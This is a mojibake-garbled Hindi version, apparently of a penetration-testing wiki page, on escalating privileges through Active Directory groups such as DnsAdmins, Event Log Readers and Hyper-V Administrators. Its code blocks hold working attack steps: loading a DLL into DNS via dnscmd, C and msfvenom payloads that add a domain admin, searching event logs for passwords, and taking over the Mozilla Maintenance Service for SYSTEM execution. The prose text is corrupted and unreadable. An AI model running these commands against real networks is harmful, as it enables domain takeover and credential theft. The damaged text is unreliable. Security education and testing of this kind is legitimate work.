рдЬреИрд╕рд╛ рдХрд┐ рдЗрд╕ \*\*\*\* [**рдкреЛрд╕реНрдЯ**](https://adsecurity.org/?p=4064) рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрдм DNS рдПрдХ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдкрд░ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬреЛ рдмрд╣реБрдд рд╕рд╛рдорд╛рдиреНрдп рд╣реИ), рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

* DNS рдкреНрд░рдмрдВрдзрди RPC рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ
* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) рд╣рдореЗрдВ рдПрдХ рдХрд╕реНрдЯрдо **DLL** рдХреЛ **рд▓реЛрдб** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, DLL рдХреЗ рдкрде рдХреА **рдХреЛрдИ рд╕рддреНрдпрд╛рдкрди** рдирд╣реАрдВ рдХреА рдЬрд╛рддреА рд╣реИред рдЗрд╕реЗ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рд╕реЗ `dnscmd` рдЯреВрд▓ рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
* рдЬрдм **`DnsAdmins`** рд╕рдореВрд╣ рдХрд╛ рд╕рджрд╕реНрдп **`dnscmd`** рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдЪрд▓рд╛рддрд╛ рд╣реИ, рддреЛ `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдкреВрд░реА рд╣реЛрддреА рд╣реИ
* рдЬрдм **DNS рд╕реЗрд╡рд╛ рдкреБрдирдГ рдЪрд╛рд▓реВ** рд╣реЛрддреА рд╣реИ, рддреЛ рдЗрд╕ рдкрде рдореЗрдВ рджрд┐рдП рдЧрдП **DLL** рдХреЛ **рд▓реЛрдб** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ (рдЕрд░реНрдерд╛рддреН, рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рд╢реЗрдпрд░ рдЬрд┐рд╕рдореЗрдВ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЗ рдорд╢реАрди рдЦрд╛рддреЗ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛ рд╕рдХрддреА рд╣реИ)
* рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ **рдХрд╕реНрдЯрдо DLL рд▓реЛрдб рдХрд░рдХреЗ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Mimikatz рдЬреИрд╕рд╛ рдПрдХ рдЙрдкрдХрд░рдг рднреА рд▓реЛрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдп** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### рдХрд┐рд╕реА рднреА DLL рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ

рдлрд┐рд░, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **DNSAdmins рд╕рдореВрд╣** рдореЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реИ, рддреЛ рдЖрдк **DNS рд╕рд░реНрд╡рд░ рдХреЛ SYSTEM рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рднреА DLL рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ (DNS рд╕реЗрд╡рд╛ `NT AUTHORITY\SYSTEM` рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рддреА рд╣реИ)ред рдЖрдк DNS рд╕рд░реНрд╡рд░ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рд╕реНрдерд╛рдиреАрдп рдпрд╛ рджреВрд░рд╕реНрде** (SMB рджреНрд╡рд╛рд░рд╛ рд╕рд╛рдЭрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛) DLL рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
```
рдПрдХ рдорд╛рдиреНрдп DLL рдХрд╛ рдЙрджрд╛рд╣рд░рдг [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL) рдореЗрдВ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИред рдореИрдВ `DnsPluginInitialize` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдХреЛрдб рдХреЛ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдмрджрд▓рдирд╛ рдЪрд╛рд╣реВрдВрдЧрд╛:
```c
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```
рдпрд╛ рдЖрдк msfvenom рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ DLL рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
рддреЛ, рдЬрдм **DNS рд╕реЗрд╡рд╛** рд╢реБрд░реВ рдпрд╛ рдкреБрдирд░рд╛рд░рдВрдн рд╣реЛрддреА рд╣реИ, рдПрдХ рдирдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

DNSAdmin рд╕рдореВрд╣ рдореЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж рдЖрдк **рдбреАрдПрдирдПрд╕ рд╕реЗрд╡рд╛ рдХреЛ рд░реЛрдХрдиреЗ рдФрд░ рдкреБрдирд░рд╛рд░рдВрдн рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред** рд▓реЗрдХрд┐рди рдЖрдк рд╣рдореЗрд╢рд╛ рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
[**рдЗрд╕ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВ ired.team рдкрд░ред**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

#### Mimilib.dll

рдЗрд╕ [**рдкреЛрд╕реНрдЯ**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) рдореЗрдВ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ `Mimikatz` рдЙрдкрдХрд░рдг рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛ рджреНрд╡рд╛рд░рд╛ [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдо рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) \*\*\*\* рдлрд╝рд╛рдЗрд▓ рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░рдХреЗ рдПрдХ **рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓** рд╡рди-рд▓рд╛рдЗрдирд░ рдпрд╛ рд╣рдорд╛рд░реА рдкрд╕рдВрдж рдХреА рдЕрдиреНрдп рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

### MitM рдХреЗ рд▓рд┐рдП WPAD рд░рд┐рдХреЙрд░реНрдб

DnsAdmins рд╕рдореВрд╣ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ **WPAD рд░рд┐рдХреЙрд░реНрдб** рдмрдирд╛рдирд╛ред рдЗрд╕ рд╕рдореВрд╣ рдореЗрдВ рд╕рджрд╕реНрдпрддрд╛ рд╣рдореЗрдВ [рд╡реИрд╢реНрд╡рд┐рдХ рдХреНрд╡реЗрд░реА рдмреНрд▓реЙрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps) рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рддреА рд╣реИред рд╕рд░реНрд╡рд░ 2008 рдиреЗ рдкрд╣рд▓реА рдмрд╛рд░ рдПрдХ DNS рд╕рд░реНрд╡рд░ рдкрд░ рдПрдХ рд╡реИрд╢реНрд╡рд┐рдХ рдХреНрд╡реЗрд░реА рдмреНрд▓реЙрдХ рд╕реВрдЪреА рдореЗрдВ рдЬреЛрдбрд╝рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреЗрд╢ рдХреАред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рд╡реЗрдм рдкреНрд░реЙрдХреНрд╕реА рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЦреЛрдЬ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (WPAD) рдФрд░ рд╕рд╛рдЗрдЯ-рдЖрдВрддрд░рд┐рдХ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЯрдирд▓ рдкрддрд╛ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (ISATAP) рд╡реИрд╢реНрд╡рд┐рдХ рдХреНрд╡реЗрд░реА рдмреНрд▓реЙрдХ рд╕реВрдЪреА рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВред рдпреЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХрд╛рдлреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рдФрд░ рдХреЛрдИ рднреА рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрди рдирд╛рдореЛрдВ рдХреЛ рд╕рдорд╛рд░реЛрд╣ рд╡рд┐рд╖рдпрдХ рдпрд╛ DNS рд░рд┐рдХреЙрд░реНрдб рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред

**рд╡реИрд╢реНрд╡рд┐рдХ рдХреНрд╡реЗрд░реА рдмреНрд▓реЙрдХ** рд╕реВрдЪреА рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдФрд░ **WPAD рд░рд┐рдХреЙрд░реНрдб** рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рдж, **рд╣рд░ рдорд╢реАрди** рдЬреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЗ рд╕рд╛рде WPAD рдЪрд▓рд╛ рд░рд╣реА рд╣реИ, рдЕрдкрдирд╛ **рдЯреНрд░реИрдлрд╝рд┐рдХ рд╣рдорд╛рд░реА рд╣рдорд▓рд╛ рдорд╢реАрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░реЙрдХреНрд╕реА рдХрд░реЗрдЧреА**ред рд╣рдо рдЯреНрд░реИрдлрд╝рд┐рдХ рд╕реНрдкреВрдлрд╝рд┐рдВрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг рдЬреИрд╕реЗ \*\*\*\* [**Responder**](https://github.com/lgandx/Responder) **рдпрд╛** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ рдХреЛ рдкрдХрдбрд╝рдиреЗ рдФрд░ рдСрдлрд╝рд▓рд╛рдЗрди рдореЗрдВ рдЙрдиреНрд╣реЗрдВ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдпрд╛ рдПрдХ SMBRelay рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## рдИрд╡реЗрдВрдЯ рд▓реЙрдЧ рдкрд╛рдардХ

[**рдИрд╡реЗрдВрдЯ рд▓реЙрдЧ рдкрд╛рдардХ**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) \*\*\*\* рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдпреЛрдВ рдХреЛ **рдИрд╡реЗрдВрдЯ рд▓реЙрдЧреНрд╕ рддрдХ рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐** рд╣реЛрддреА рд╣реИ (рдЬреИрд╕реЗ рдирдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирд┐рд░реНрдорд╛рдг рд▓реЙрдЧреНрд╕)ред рд▓реЙрдЧреНрд╕ рдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рдорд┐рд▓ рд╕рдХрддреА рд╣реИред рдЪрд▓рд┐рдП рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рд▓реЙрдЧреНрд╕ рдХреЛ рджреГрд╢реНрдпреАрдХрд░рдг рдХреИрд╕реЗ рдХрд░реЗрдВ:
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Event Log Readers"

# To find "net [...] /user:blahblah password"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Using other users creds
wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findstr "/user"

# Search using PowerShell
Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
## рдПрдХреНрд╕рдЪреЗрдВрдЬ рд╡рд┐рдВрдбреЛрдЬрд╝ рдЕрдиреБрдорддрд┐рдпрд╛рдБ

рд╕рджрд╕реНрдпреЛрдВ рдХреЛ **рдбреЛрдореЗрди рдСрдмреНрдЬреЗрдХреНрдЯ рдкрд░ рдПрдХ рдбреИрдХрд▓ рд▓рд┐рдЦрдиреЗ** рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рддреА рд╣реИред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ [**DCSync**](dcsync.md) рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИред
рдпрджрд┐ AD рдкрд░рд┐рд╡реЗрд╢ рдореЗрдВ Microsoft Exchange рд╕реНрдерд╛рдкрд┐рдд рд╣реИ, рддреЛ рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдФрд░ рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдХреЛ рдЦреЛрдЬрдирд╛ рд╕рд╛рдорд╛рдиреНрдп рд╣реИред

рдпрд╣ [**GitHub рд░реЗрдкреЛ**](https://github.com/gdedrouas/Exchange-AD-Privesc) рдЗрд╕ рд╕рдореВрд╣ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рдХреБрдЫ **рддрдХрдиреАрдХреЛрдВ** рдХреА рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд░рддрд╛ рд╣реИред
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V рдкреНрд░рд╢рд╛рд╕рдХ

[**Hyper-V рдкреНрд░рд╢рд╛рд╕рдХ**](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) рд╕рдореВрд╣ рдХреЛ рд╕рднреА [Hyper-V рд╕реБрд╡рд┐рдзрд╛рдУрдВ](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines) рдХрд╛ рдкреВрд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред рдпрджрд┐ **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕** рдХреЛ **рд╡рд░реНрдЪреБрдЕрд▓рд╛рдЗрдЬрд╝реНрдб** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ **рд╡рд░реНрдЪреБрдЕрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ** рдХреЛ **рдбреЛрдореЗрди рдПрдбрдорд┐рдиреНрд╕** рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд┐рдЪрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рд╡реЗ рдЖрд╕рд╛рдиреА рд╕реЗ **рд▓рд╛рдЗрд╡ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреА рдХреНрд▓реЛрди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рд╡рд░реНрдЪреБрдЕрд▓ **рдбрд┐рд╕реНрдХ** рдХреЛ рдСрдлрд╝рд▓рд╛рдЗрди рдорд╛рдЙрдВрдЯ рдХрд░рдХреЗ **`NTDS.dit`** рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдбреЛрдореЗрди рдореЗрдВ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ NTLM рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ [рдмреНрд▓реЙрдЧ](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/) рдкрд░ рднреА рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХреГрдд рд╣реИ рдХрд┐ рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди рдХреЛ **рд╣рдЯрд╛рдиреЗ** рдкрд░, `vmms.exe` рд╕рдВрдмрдВрдзрд┐рдд **`.vhdx` рдлрд╝рд╛рдЗрд▓** рдкрд░ рдореВрд▓ рдлрд╝рд╛рдЗрд▓ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ **рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдпрд╣ `NT AUTHORITY\SYSTEM` рдХреЗ рд░реВрдк рдореЗрдВ рдХрд░рддрд╛ рд╣реИ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЕрдиреБрдХрд░рдг рдХрд░рдХреЗ рдирд╣реАрдВред рд╣рдо **`.vhdx`** рдлрд╝рд╛рдЗрд▓ рдХреЛ **рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд SYSTEM рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рд╛рдХреГрддрд┐рдХ **рд╣рд╛рд░реНрдб рд▓рд┐рдВрдХ** рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЖрдкрдХреЛ рдкреВрд░реА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реЗрдЧреАред

рдпрджрд┐ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) рдпрд╛ [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841) рдХреЗ рд▓рд┐рдП рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╣реИ, рддреЛ рд╣рдо рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SYSTEM рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдиреНрдпрдерд╛, рд╣рдо рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рд╕рд░реНрд╡рд░ рдкрд░ рдПрдХ рдРрд╕реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдПрдВ рдЬрд┐рд╕рдиреЗ SYSTEM рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓рдиреЗ рд╡рд╛рд▓реА рд╕реЗрд╡рд╛ рд╕реНрдерд╛рдкрд┐рдд рдХреА рд╣реИ**, рдЬрд┐рд╕реЗ рдЕрдирдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### **рд╢реЛрд╖рдг рдЙрджрд╛рд╣рд░рдг**

рдЗрд╕рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ **Firefox**, рдЬреЛ **`Mozilla Maintenance Service`** рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИред рд╣рдо рдЗрд╕ [рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (NT рд╣рд╛рд░реНрдб рд▓рд┐рдВрдХ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдг-рдЙрджрд╛рд╣рд░рдг) рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╣рдорд╛рд░реЗ рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рд╛рдЗрд▓ рдкрд░ рдкреВрд░реА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реЗ:
```bash
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **рдлрд╝рд╛рдЗрд▓ рдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдХреЛ рдЕрдзрд┐рдХрд╛рд░ рдореЗрдВ рд▓реЗрдирд╛**

PowerShell рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдореЗрдВ рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╣рдо рдЗрд╕рдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдХреЛ рдЕрдзрд┐рдХрд╛рд░ рдореЗрдВ рд▓реЗ рд╕рдХрддреЗ рд╣реИрдВред
```bash
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **рдореЛрдЬрд╝рд┐рд▓рд╛ рд░рдЦрд░рдЦрд╛рд╡ рд╕реЗрд╡рд╛ рдХреЛ рд╢реБрд░реВ рдХрд░рдирд╛**

рдЕрдЧрд▓реЗ, рд╣рдо рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдХ **рд╣рд╛рдирд┐рдХрд╛рд░рдХ `maintenanceservice.exe`** рдХреЗ рд╕рд╛рде рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдореЗрдВрдЯреЗрдиреЗрдВрд╕ рд╕реЗрд╡рд╛ рдХреЛ **рд╢реБрд░реВ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ SYSTEM рдХреЗ рд░реВрдк рдореЗрдВ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
C:\htb> sc.exe start MozillaMaintenance
```
{% hint style="info" %}
